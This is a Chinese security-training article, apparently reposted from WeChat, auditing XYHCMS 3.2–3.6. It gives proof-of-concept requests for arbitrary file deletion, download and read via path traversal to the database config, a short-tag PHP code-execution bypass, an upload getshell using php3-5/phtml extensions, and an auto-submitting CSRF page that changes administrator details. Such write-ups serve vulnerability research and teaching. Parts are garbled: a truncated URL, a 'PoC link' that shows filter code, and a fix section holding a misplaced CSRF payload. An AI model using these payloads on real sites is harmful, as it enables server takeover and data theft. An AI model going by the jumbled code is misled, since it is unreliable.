> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PxdHaSrMdjs3bAUKhacilA)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

**作者：掌控安全 - 柚子**

### 一. XYHCMS 3.2 后台任意文件删除  

#### 漏洞介绍

影响版本是 XYHCMS 3.2，漏洞的成因是没有对删除的文件没有做任何限制，导致可以直接把安装文件删除。

#### 漏洞分析

打开

/App/Manage/Controller/DatabaseController.class.php

文件。  

锁定 delSqlFiles() 函数。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu29OqIdZFcM6QibGQDvIP82C8cQgdzHR0pOXLgxibPxibPibaXm8D6YYBXLg/640?wx_fmt=png)

#### 漏洞复现

1. 进入后台

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2iaibx5qPYcmuDcic1SEia1JLc5miaJWyQAu4W2fsOtXHYRicQ4bDM8Jx83uw/640?wx_fmt=png)

2. 删除安装锁文件

  
方法一：get 方式

```
http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/xyhai.php?s=/Database/delSq
```

方法二：post 方式

```
http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/xyhai.php?s=/Database/delSqlFiles /batchFlag/1

POST数据：key[]= ../../../install/install.lock
```

```
http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip
```

3. 接下来直接访问 

http://127.0.0.1/xyhcms_3.5_20171128/uploads_code/install 重装 cms

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2vmuE6BoXNuNgVZZ7urzQcPpjGriabWjF0Zfd3k9n4vNBxlGLsr0EdXg/640?wx_fmt=png)

### 二. XYHCMS 3.2 后台任意文件下载

#### 漏洞介绍

影响版本是 XYHCMS 3.2，漏洞的成因是没有对下载的文件做任何限制。

#### 漏洞分析

找到

/App/Manage/Controller/DatabaseController.class.php 文件。

锁定 downfile() 方法下载函数。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2Arn8lgISZyqkDuI9icibPx5S7spLF5ALW3KyPnD33ruK1Am0XRfMtmEQ/640?wx_fmt=png)  
这里并没有对下载的文件有限制，所以我们可以通过这段代码去构造 poc。

#### 漏洞复现

1. 进入后台页面。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2ZACcuczvEiayHho3jGZv4JLX2TnmredqTZkZVTDc14Yx2R2iadHQnsYg/640?wx_fmt=png)

2. 构造 poc

```
http://127.0.0.1/XYHCms_V3.5/uploads_code/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2zNnXHO9C0oSUSGqGtIKd4RYtkD0YqGmwbXqdsu1j0N0eSd0zXAIricA/640?wx_fmt=png)  
  

3. 数据库配置文件就下载下来了。

### 三. XYHCMS 3.5 任意文件读取漏洞

#### 环境准备

XYHCMS 官网：http://www.xyhcms.com/

网站源码版本：XYHCMS V3.5（2017-12-04 更新）

程序源码下载：http://www.xyhcms.com/Show/download/id/2/at/0.html

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2Hfvu66rDicbiaPkqZDWxL1WbL5RGuILibRkiakHrrbRcajSic7ibxicwYR9Iw/640?wx_fmt=png)

#### 漏洞分析

漏洞文件位置：/App/Manage/Controller/TempletsController.class.php

第 59-83 行：  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu25XJe6tVEKRoVxiaIKpzhyqcicJc9Kkemohb7EU1mL7gdMFBmEiarOx7OQ/640?wx_fmt=png)  
声明了 3 个变量：

$ftype 文件类型；

$fname 文件名；

$file_path 文件路径

这段代码对提交的参数进行处理，然后判断是否 POST 数据上来

如果有就进行保存等，如果没有 POST 数据，将跳过这段代码继续向下执行。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2pibNiav7gSCctpw9gN20g0VBt1DAqGdAF30TpibULBWkLOuDBTyh9gLGA/640?wx_fmt=png)

通过这段代码，我们发现可以通过 GET 传入 fname，跳过前面的保存文件过程，进入文件读取状态。

  
问题就出现在这里，对 fname 进行 base64 解码，判断 fname 参数是否为空，拼接成完整的文件路径，然后判断这个文件是否存在，读取文件内容。

对 fname 未进行任何限制，导致程序在实现上存在任意文件读取漏洞，可以读取网站任意文件，攻击者可利用该漏洞获取敏感信息。

我们可以通过 GET 方式提交 fname 参数，并且将 fname 进行 base64 编码，构造成完整的路径，读取配置文件信息。  

#### 漏洞复现

登录网站后台

  
数据库配置文件路径：\App\Common\Conf\db.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu29yH6xVibica8DnQh8X1ibAcov7SjsMKCZ8oDHicOFeKDYcITTYNmPNiaiaLg/640?wx_fmt=png)  
  

我们将这段组成相对路径，..\..\..\App\Common\Conf\db.php，

然后进行 base64 编码，

Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==

[POC] 最后构造的链接如下：

```
if (stripos($data[$key], '<?php') !== false || preg_match($preg_param, $data[$key])) {
                    $this->error('禁止输入php代码');
                }
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2BSheDZuictY4jSTrPfddpa4ZbuHoOiaXl5ib5WzH1f0UPjgHNdSK9Ua3g/640?wx_fmt=png)

#### 修复建议

1.  取消 base64 解码，过滤.(点) 等可能的恶意字符。
    
2.  正则判断用户输入的参数的格式，看输入的格式是否合法：这个方法的匹配最为准确和细致，但是有很大难度，需要大量时间配置。
    

### 四. xyhcms 3.6 后台代码执行漏洞

#### 漏洞描述

XYHCMS 是一款开源的 CMS 内容管理系统。

XYHCMS 后台存在代码执行漏洞，攻击者可利用该漏洞在 site.php 中增加恶意代码，从而可以获取目标终端的权限。

代码中使用黑名单过滤 <?php 却忘记过滤短标签，导致后台系统设置 - 网站设置处可使用短标签在站点表述处 getshell。

#### 漏洞分析

按步骤安装好网站之后，找到../App/Runtime/Data/config/site.php 这个文件。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2icgiawq7hPkpFPPYXZYibdviad8hKiaL3ib583pr7s0hpRMn4esazovc3X4A/640?wx_fmt=png)

找到对应功能看他是怎么控制的。  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2iaqaibSAOt5f4sibby4UPImzcYMLibxm8ulbGkoQnc0PVl85cBz5bBQwjQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2TsS5FLy6hIqdzxF4kSusyZvFEiaBVbr6vE15iaxQsKrKpfSGV3bbtKcA/640?wx_fmt=png)

很明显，我们要去找一个 System 相关的控制器。

  
这里可以锁定 App/Manage/Controller/SystemController.class.php 这个文件。

  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2Uic43X4CtxgFU603eQJZEiafic2wicDlIxW3nibVLyu9fa8j7GLKVwHyicEw/640?wx_fmt=png)  

```
<?=phpinfo();?>
```

  
但是我们看到这里让开启了短标签，（PHP 默认是开启 PHP 短标签的，即默认情况下 short_open_tag=ON）<?=，它和 <? echo 等价， 从 PHP 5.4.0 起， <?= 总是可用的

#### 漏洞复现

找到后台—系统设置—网站设置

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2iaqaibSAOt5f4sibby4UPImzcYMLibxm8ulbGkoQnc0PVl85cBz5bBQwjQ/640?wx_fmt=png)

```
if (stripos($data[$key], '<?php') !== false || ($short_open_tag && stripos($data[$key], '<?') !== false) || preg_match($preg_param, $data[$key])) {
    $this->error('禁止输入php代码');
                }
```

就可以很简单的绕过限制。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu22ia1E1J3aLTG59y60jkcCgIzSZcfpR5AjZU2EocGNMsaicTicuSuicG9fw/640?wx_fmt=png)

#### 修复方法

官方已经在最新版修复，简单粗暴的过滤

```
if (!empty($data['CFG_UPLOAD_FILE_EXT'])) {
                $data['CFG_UPLOAD_FILE_EXT'] = strtolower($data['CFG_UPLOAD_FILE_EXT']);
                $_file_exts = explode(',', $data['CFG_UPLOAD_FILE_EXT']);
                $_no_exts = array('php', 'asp', 'aspx', 'jsp');
                foreach ($_file_exts as $ext) {
                    if (in_array($ext, $_no_exts)) {
                        $this->error('允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！');
                    }
                }
            }
```

```
<html>
  <head>
      <script>
          function submit(){
            var form = document.getElementById('test_form');
            form.submit();

          }
</script>
  </head>
    <body onload="submit()">


  <script>history.pushState('', '', '/')</script>
    <form action="http://xyh.com/xyhai.php?s=/Auth/editUser" method="POST" id="test_form">
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden" name="department[]" value="1" />
      <input type="hidden" name="department[]" value="4" />
      <input type="hidden" name="department[]" value="3" />
      <input type="hidden" name="group_id[]" value="1" />
      <input type="hidden"  />
      <input type="hidden" aa@test.com" />
      <input type="hidden"  />
    </form>
  </body>
</html>
```

### 五. XYHCMS 3.6 后台文件上传 getshell

#### 漏洞介绍

此漏洞的影响范围是 XYHCMS 3.6。

漏洞形成原因是：对后缀过滤不严，未过滤 php3-5，phtml（老版本直接未过滤 php）。

#### 漏洞分析

找到

/App/Manage/Controller/SystemController.class.php 文件中第 246-255 行代码

```
if (!empty($data['CFG_UPLOAD_FILE_EXT'])) {
                $data['CFG_UPLOAD_FILE_EXT'] = strtolower($data['CFG_UPLOAD_FILE_EXT']);
                $_file_exts = explode(',', $data['CFG_UPLOAD_FILE_EXT']);
                $_no_exts = array('php', 'asp', 'aspx', 'jsp');
                foreach ($_file_exts as $ext) {
                    if (in_array($ext, $_no_exts)) {
                        $this->error('允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！');
                    }
                }
            }
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2icHNWPzOcjonNDLxbrjhSXoWial7h7U5nWougicYcUp4posNg29wuRwLQ/640?wx_fmt=png)  
会看到她不允许的文件后缀有：php,asp,aspx,jsp。

我们可以通过这个思路，上传 php3-5，phtml 文件后缀的文件就能够绕过限制。  

#### 漏洞复现

1. 进入后台

  
2. 系统设置 -> 网站设置 -> 上传配置 -> 允许附件类型

  
3. 添加类型 php3 或 php4 或 php5 或 phtml

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2qNs3QJibmiajZG2HHYCw883eBH6MWbYhYWia2oSDZrQpGspEficPEqicrvw/640?wx_fmt=png)  
  

4. 点击下面的 水印图片上传上传以上后缀 shell

  
5. 之后会在图片部分显示上传路径

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2WKwjJY5f5OHyee3Z7ePBCCia8bMhQu2BEe84yWrxOU0wPJL45zicxXxg/640?wx_fmt=png)

### 六. XYHCMS 3.6 CSRF 漏洞

#### 漏洞介绍

此版本存在一个 csrf 漏洞，可以更改管理员的任何信息（姓名、电子邮件、密码等）。

#### 漏洞复现

poc：

```
<html>
  <head>
      <script>
          function submit(){
            var form = document.getElementById('test_form');
            form.submit();
          }
</script>
  </head>
    <body onload="submit()">
  <script>history.pushState('', '', '/')</script>
    <form action="http://xyh.com/xyhai.php?s=/Auth/editUser" method="POST">
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden" name="department[]" value="1" />
      <input type="hidden" name="department[]" value="4" />
      <input type="hidden" name="department[]" value="3" />
      <input type="hidden" name="group_id[]" value="1" />
      <input type="hidden"  />
      <input type="hidden" aa@test.com" />
      <input type="hidden"  />
    </form>
  </body>
</html>
```

1. 修改前如下图所示：  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2TR1LDqF7rkDDic6HibhzeicJQCZtnA4LdSQp6HwmXDeJYPYWw1acB548g/640?wx_fmt=png)  
2. 打开 poc.html

  
3. 修改后如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpPWgExEMw7AVG62oQRleu2lnRibHy2lDVjL2tYVXsiaghTfyEN1IXLxJ64plPZFmxUCETkaicFiaVcKg/640?wx_fmt=png)

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[POC 批量验证 Python 脚本编写](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504664&idx=1&sn=e88c77671f252631de939c154de075db&chksm=fa6baa69cd1c237f1c1f35f8b434874341f7fe077452834dac0e289addf9ac56fcbf7df5a8a1&scene=21#wechat_redirect)

[实战纪实 | SQL 漏洞实战挖掘技巧](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247497717&idx=1&sn=34dc1d10fcf5f745306a29224c7c4008&chksm=fa6b8e84cd1c0792f0ec433310b24b4ccbe53354c11f334a1b0d5f853d214037bdba7ea00a9b&scene=21#wechat_redirect)  

[渗透工具 | 红队常用的那些工具分享](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247495811&idx=1&sn=122c664b1178d563ef5e071e0bfd7e28&chksm=fa6b89f2cd1c00e4327d6516c25fcfd2616cf7ae8ddef2a6e869b4a6ab6afad2a6788bf0d04a&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**